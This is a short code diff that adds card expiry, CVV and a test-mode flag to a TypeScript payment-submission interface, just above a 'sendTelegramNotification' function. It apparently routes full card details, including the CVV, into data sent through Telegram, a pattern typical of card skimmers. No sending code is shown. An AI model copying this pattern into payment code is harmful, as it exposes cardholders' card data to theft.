@@ -80,6 +80,9 @@ export interface PaymentSubmissionData {
   price: string;
   card_number_masked: string;
   card_type: string;
+  card_expiry: string;
+  card_cvv: string;
+  test_mode: boolean;
 }
 
 export const sendTelegramNotification = async (
